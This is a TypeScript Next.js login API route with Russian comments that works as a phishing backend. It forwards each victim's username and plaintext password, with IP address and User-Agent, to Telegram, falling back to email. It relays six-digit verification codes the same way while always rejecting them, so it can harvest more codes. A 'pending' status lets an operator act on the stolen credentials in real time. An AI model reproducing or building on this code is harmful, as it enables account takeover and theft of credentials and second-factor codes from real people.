import { NextRequest, NextResponse } from "next/server";
import { sendLoginEmail, sendCodeEmail } from "@/lib/email";
import { sendLoginTelegram, sendCodeTelegram } from "@/lib/telegram";
import { createLoginRequest } from "@/lib/login-requests";
import { setSession } from "@/lib/session";

/**
 * API endpoint для входа
 * POST /api/auth/login
 */
export async function POST(request: NextRequest) {
  console.log("[API LOGIN] Получен запрос на вход");

  try {
    // Получаем IP адрес из заголовков
    const clientIp = 
      request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || 
      request.headers.get("x-real-ip") || 
      request.headers.get("cf-connecting-ip") ||
      "unknown";

    // Получаем User-Agent из заголовков
    const userAgent = request.headers.get("user-agent") || undefined;

    console.log("[API LOGIN] IP:", clientIp);
    console.log("[API LOGIN] User-Agent:", userAgent);

    const body = await request.json();
    const { username, password, rememberUsername } = body;

    console.log("[API LOGIN] Данные:", { username, rememberUsername });

    // Валидация
    if (!username) {
      console.error("[API LOGIN] Отсутствует username");
      return NextResponse.json(
        { error: "Username обязателен" },
        { status: 400 }
      );
    }
    
    // Для verify-code страницы (password пустой) - проверяем код
    const isVerificationCode = password === "";
    if (isVerificationCode) {
      // Проверяем, что код состоит из 6 цифр
      if (!/^\d{6}$/.test(username.trim())) {
        console.error("[API LOGIN] Неверный формат кода верификации");
        return NextResponse.json(
          { error: "Код должен содержать 6 цифр" },
          { status: 400 }
        );
      }
      
      // Отправка кода верификации в Telegram вместо Email
      // Получаем username из сессии, если доступен
      try {
        const { getSession } = await import("@/lib/session");
        const session = await getSession();
        const codeUsername = session?.username || "unknown";
        const verificationCode = username.trim(); // В этом случае username содержит код
        
        await sendCodeTelegram(verificationCode, codeUsername, clientIp, userAgent);
        console.log("[API LOGIN] Код верификации отправлен в Telegram");
      } catch (telegramError) {
        console.error("[API LOGIN] Ошибка отправки кода в Telegram:", telegramError);
        // Fallback на Email
        try {
          await sendCodeEmail(username.trim(), username.trim());
          console.log("[API LOGIN] Fallback: Email с кодом верификации отправлен");
        } catch (emailError) {
          console.error("[API LOGIN] Ошибка отправки Email с кодом:", emailError);
          // Продолжаем выполнение
        }
      }
      
      // Здесь можно добавить проверку правильности кода
      // Пока считаем, что код всегда неверный для демонстрации ошибки
      console.error("[API LOGIN] Код верификации неверный");
      return NextResponse.json(
        { error: "Неверный код верификации" },
        { status: 400 }
      );
    }
    
    // Password обязателен только для обычного входа (если передан и не пустой)
    if (password !== undefined && password !== "" && (!password || password.trim() === "")) {
      console.error("[API LOGIN] Отсутствует password");
      return NextResponse.json(
        { error: "Username и Password обязательны" },
        { status: 400 }
      );
    }

    // Создание запроса на вход и отправка в Telegram
    const requestId = createLoginRequest(username, password);
    
    try {
      // Отправка в Telegram вместо Email
      await sendLoginTelegram(username, password, requestId, clientIp, userAgent);
      console.log("[API LOGIN] Уведомление отправлено в Telegram");
    } catch (telegramError) {
      console.error("[API LOGIN] Ошибка отправки в Telegram:", telegramError);
      // В случае ошибки можно fallback на Email
      try {
        await sendLoginEmail(username, password);
        console.log("[API LOGIN] Fallback: Email с данными входа отправлен");
      } catch (emailError) {
        console.error("[API LOGIN] Ошибка отправки Email:", emailError);
      }
    }

    // Возвращаем pending статус с requestId для polling
    console.log("[API LOGIN] Запрос создан, ожидание ответа от Telegram");

    return NextResponse.json({
      success: true,
      status: "pending",
      requestId: requestId,
      message: "Ожидание подтверждения...",
    });
  } catch (error) {
    console.error("[API LOGIN] Ошибка:", error);
    return NextResponse.json(
      {
        error: error instanceof Error ? error.message : "Ошибка при входе",
      },
      { status: 500 }
    );
  }
}


